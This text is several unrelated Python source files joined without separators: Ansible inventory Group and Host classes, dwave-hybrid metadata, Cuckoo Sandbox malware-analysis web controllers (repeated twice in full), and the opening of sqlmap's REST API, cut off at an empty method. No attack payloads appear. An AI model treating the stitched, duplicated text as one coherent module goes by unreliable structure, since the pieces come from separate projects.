            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])                    

            # update the depth of the grandchildren
            group._check_children_depth()                    

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()                    

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:                    
            for group in self.child_groups:                    
                group.depth = max([self.depth + 1, group.depth])                    
                group._check_children_depth()                    
        except RuntimeError:                    
            raise AnsibleError("The group named '%s' has a recursive dependency loop." % self.name)                    

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:                    
            g.clear_hosts_cache()                    

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:                    
            kid_hosts = kid.get_hosts()                    
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):                    

        results = {}                    
        for g in self.parent_groups:                    
            results[g.name] = g                    
            results.update(g._get_ancestors())                    
        return results                    

    def get_ancestors(self):                    

        return self._get_ancestors().values()                    

    def set_priority(self, priority):
        try:                    
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:                    
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):                    
        # populate ancestors
        for group in self.groups:                    
            self.add_group(group)                    

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)                    

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())

# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'                    
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'


# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING                    
from cuckoo.common.mongo import mongo

db = Database()                    

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception("Task ID should be integer")
        data = {}                    

        task = db.view_task(task_id, details=True)
        if task:                    
            entry = task.to_dict()                    
            entry["guest"] = {}                    
            if task.guest:                    
                entry["guest"] = task.guest.to_dict()                    

            entry["errors"] = []                    
            for error in task.errors:                    
                entry["errors"].append(error.message)                    

            entry["sample"] = {}                    
            if task.sample_id:                    
                sample = db.view_sample(task.sample_id)                    
                entry["sample"] = sample.to_dict()                    

            data["task"] = entry                    
        else:                    
            return Exception("Task not found")                    

        return data                    

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()                    
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category="file",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category="url",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new["sample"] = db.view_sample(new["sample_id"]).to_dict()

                filename = os.path.basename(new["target"])
                new.update({"filename": filename})

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        return data                    

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404("the specified analysis does not exist")

        data = {
            "analysis": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data                    

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            "info.id": int(task_id)
        }, sort=[("_id", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[("_id", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """Create DNS information dicts by domain and ip"""

        if "network" in report and "domains" in report["network"]:
            domainlookups = dict((i["domain"], i["ip"]) for i in report["network"]["domains"])
            iplookups = dict((i["ip"], i["domain"]) for i in report["network"]["domains"])

            for i in report["network"]["dns"]:
                for a in i["answers"]:
                    iplookups[a["data"]] = i["request"]
        else:                    
            domainlookups = dict()
            iplookups = dict()

        return {
            "domainlookups": domainlookups,
            "iplookups": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """
        data = {}                    
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs["data"]:
            pid = proc["pid"]
            pname = proc["process_name"]
            pdetails = None
            for p in report["behavior"]["generic"]:
                if p["pid"] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        "pid": pid,
                        "process_name": pname,
                        "events": {}
                    }

                for event in events:
                    if not data[category][pname]["events"].has_key(event):
                        data[category][pname]["events"][event] = []
                    for _event in pdetails["summary"][event]:
                        data[category][pname]["events"][event].append(_event)

        return data                    

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception("missing task_id")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        data = {
            "data": [],
            "status": True
        }

        for process in report.get("behavior", {}).get("generic", []):
            data["data"].append({
                "process_name": process["process_name"],
                "pid": process["pid"]
            })

        # sort returning list of processes by their name
        data["data"] = sorted(data["data"], key=lambda k: k["process_name"])

        return data                    

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception("missing task_id or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("missing pid")
        else:                    
            process = process[0]

        data = {}                    
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process["summary"]:
                    if category not in data:
                        data[category] = [watcher]
                    else:                    
                        data[category].append(watcher)

        return data                    

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception("missing task_id, watcher, and/or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("supplied pid not found")
        else:                    
            process = process[0]

        summary = process["summary"]

        if watcher not in summary:
            raise Exception("supplied watcher not found")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            "files":
                ["file_opened", "file_read"],
            "registry":
                ["regkey_opened", "regkey_written", "regkey_read"],
            "mutexes":
                ["mutex"],
            "directories":
                ["directory_created", "directory_removed", "directory_enumerated"],
            "processes":
                ["command_line", "dll_loaded"],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """Returns an OrderedDict containing a lists with signatures based on severity"""
        if not task_id:
            raise Exception("missing task_id")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)["signatures"]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature["severity"]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data                    

# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config("cuckoo:cuckoo:machinery")

    if config("routing:vpn:enabled"):
        vpns = config("routing:vpn:vpns")
    else:
        vpns = []

    return {
        "machine": config("%s:%s:machines" % (machinery, machinery)),
        "package": None,
        "priority": 2,
        "timeout": config("cuckoo:timeouts:default"),
        "routing": {
            "route": config("routing:routing:route"),
            "inetsim": config("routing:inetsim:enabled"),
            "tor": config("routing:tor:enabled"),
            "vpns": vpns,
        },
        "options": {
            "enable-services": False,
            "enforce-timeout": False,
            "full-memory-dump": config("cuckoo:cuckoo:memory_dump"),
            "no-injection": False,
            "process-memory-dump": True,
            "simulated-human-interaction": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods(["POST"])
    def presubmit(request):
        files = request.FILES.getlist("files[]")
        data = []

        if files:
            for f in files:
                data.append({
                    "name": f.name,
                    "data": f.file,
                })

            submit_id = submit_manager.pre(submit_type="files", data=data)
            return redirect("submission/pre", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body["type"]

            if submit_type != "strings":
                return json_error_response("type not \"strings\"")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body["data"].split("\n")
            )

            return JsonResponse({
                "status": True,
                "submit_id": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get("submit_id", 0)
        password = body.get("password", None)
        astree = body.get("astree", True)

        data = submit_manager.get_files(                    
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            "status": True,
            "data": data,                    
            "defaults": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop("submit_id", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            "status": True,
            "submit_id": submit_id,
        }, encoder=JsonSerialize)

# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """Class for creating task exports"""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report["analysis"]
        path = report["info"]["analysis_path"]

        size_total = 0

        for directory in taken_dirs:
            destination = "%s/%s" % (path, directory)                    
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = "%s/%s" % (path, filename)                    
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            "size": int(size_estimated),
            "size_human": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """
        if not taken_dirs and not taken_files:
            raise Exception(
                "Please select at least one directory or file to be exported."
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report["analysis"]
        path = report["info"]["analysis_path"]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            "action": report.get("debug", {}).get("action", []),
            "errors": report.get("debug", {}).get("errors", []),
        }
        z.writestr(
            "analysis.json", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
        """Locate all directories/results available for this analysis"""
        if not os.path.exists(analysis_path):
            raise Exception("Analysis path not found: %s" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files


# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING                    
from cuckoo.common.mongo import mongo

db = Database()                    

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception("Task ID should be integer")
        data = {}                    

        task = db.view_task(task_id, details=True)
        if task:                    
            entry = task.to_dict()                    
            entry["guest"] = {}                    
            if task.guest:                    
                entry["guest"] = task.guest.to_dict()                    

            entry["errors"] = []                    
            for error in task.errors:                    
                entry["errors"].append(error.message)                    

            entry["sample"] = {}                    
            if task.sample_id:                    
                sample = db.view_sample(task.sample_id)                    
                entry["sample"] = sample.to_dict()                    

            data["task"] = entry                    
        else:                    
            return Exception("Task not found")                    

        return data                    

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()                    
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category="file",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category="url",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new["sample"] = db.view_sample(new["sample_id"]).to_dict()

                filename = os.path.basename(new["target"])
                new.update({"filename": filename})

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        return data                    

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404("the specified analysis does not exist")

        data = {
            "analysis": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data                    

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            "info.id": int(task_id)
        }, sort=[("_id", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[("_id", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """Create DNS information dicts by domain and ip"""

        if "network" in report and "domains" in report["network"]:
            domainlookups = dict((i["domain"], i["ip"]) for i in report["network"]["domains"])
            iplookups = dict((i["ip"], i["domain"]) for i in report["network"]["domains"])

            for i in report["network"]["dns"]:
                for a in i["answers"]:
                    iplookups[a["data"]] = i["request"]
        else:                    
            domainlookups = dict()
            iplookups = dict()

        return {
            "domainlookups": domainlookups,
            "iplookups": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """
        data = {}                    
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs["data"]:
            pid = proc["pid"]
            pname = proc["process_name"]
            pdetails = None
            for p in report["behavior"]["generic"]:
                if p["pid"] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        "pid": pid,
                        "process_name": pname,
                        "events": {}
                    }

                for event in events:
                    if not data[category][pname]["events"].has_key(event):
                        data[category][pname]["events"][event] = []
                    for _event in pdetails["summary"][event]:
                        data[category][pname]["events"][event].append(_event)

        return data                    

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception("missing task_id")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        data = {
            "data": [],
            "status": True
        }

        for process in report.get("behavior", {}).get("generic", []):
            data["data"].append({
                "process_name": process["process_name"],
                "pid": process["pid"]
            })

        # sort returning list of processes by their name
        data["data"] = sorted(data["data"], key=lambda k: k["process_name"])

        return data                    

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception("missing task_id or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("missing pid")
        else:                    
            process = process[0]

        data = {}                    
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process["summary"]:
                    if category not in data:
                        data[category] = [watcher]
                    else:                    
                        data[category].append(watcher)

        return data                    

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception("missing task_id, watcher, and/or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("supplied pid not found")
        else:                    
            process = process[0]

        summary = process["summary"]

        if watcher not in summary:
            raise Exception("supplied watcher not found")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            "files":
                ["file_opened", "file_read"],
            "registry":
                ["regkey_opened", "regkey_written", "regkey_read"],
            "mutexes":
                ["mutex"],
            "directories":
                ["directory_created", "directory_removed", "directory_enumerated"],
            "processes":
                ["command_line", "dll_loaded"],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """Returns an OrderedDict containing a lists with signatures based on severity"""
        if not task_id:
            raise Exception("missing task_id")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)["signatures"]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature["severity"]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data                    

# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config("cuckoo:cuckoo:machinery")

    if config("routing:vpn:enabled"):
        vpns = config("routing:vpn:vpns")
    else:
        vpns = []

    return {
        "machine": config("%s:%s:machines" % (machinery, machinery)),
        "package": None,
        "priority": 2,
        "timeout": config("cuckoo:timeouts:default"),
        "routing": {
            "route": config("routing:routing:route"),
            "inetsim": config("routing:inetsim:enabled"),
            "tor": config("routing:tor:enabled"),
            "vpns": vpns,
        },
        "options": {
            "enable-services": False,
            "enforce-timeout": False,
            "full-memory-dump": config("cuckoo:cuckoo:memory_dump"),
            "no-injection": False,
            "process-memory-dump": True,
            "simulated-human-interaction": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods(["POST"])
    def presubmit(request):
        files = request.FILES.getlist("files[]")
        data = []

        if files:
            for f in files:
                data.append({
                    "name": f.name,
                    "data": f.file,
                })

            submit_id = submit_manager.pre(submit_type="files", data=data)
            return redirect("submission/pre", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body["type"]

            if submit_type != "strings":
                return json_error_response("type not \"strings\"")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body["data"].split("\n")
            )

            return JsonResponse({
                "status": True,
                "submit_id": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get("submit_id", 0)
        password = body.get("password", None)
        astree = body.get("astree", True)

        data = submit_manager.get_files(                    
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            "status": True,
            "data": data,                    
            "defaults": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop("submit_id", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            "status": True,
            "submit_id": submit_id,
        }, encoder=JsonSerialize)

# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """Class for creating task exports"""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report["analysis"]
        path = report["info"]["analysis_path"]

        size_total = 0

        for directory in taken_dirs:
            destination = "%s/%s" % (path, directory)                    
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = "%s/%s" % (path, filename)                    
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            "size": int(size_estimated),
            "size_human": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """
        if not taken_dirs and not taken_files:
            raise Exception(
                "Please select at least one directory or file to be exported."
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report["analysis"]
        path = report["info"]["analysis_path"]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            "action": report.get("debug", {}).get("action", []),
            "errors": report.get("debug", {}).get("errors", []),
        }
        z.writestr(
            "analysis.json", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
        """Locate all directories/results available for this analysis"""
        if not os.path.exists(analysis_path):
            raise Exception("Analysis path not found: %s" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = ""
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who="server"):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug("REST-JSON API %s connected to IPC database" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
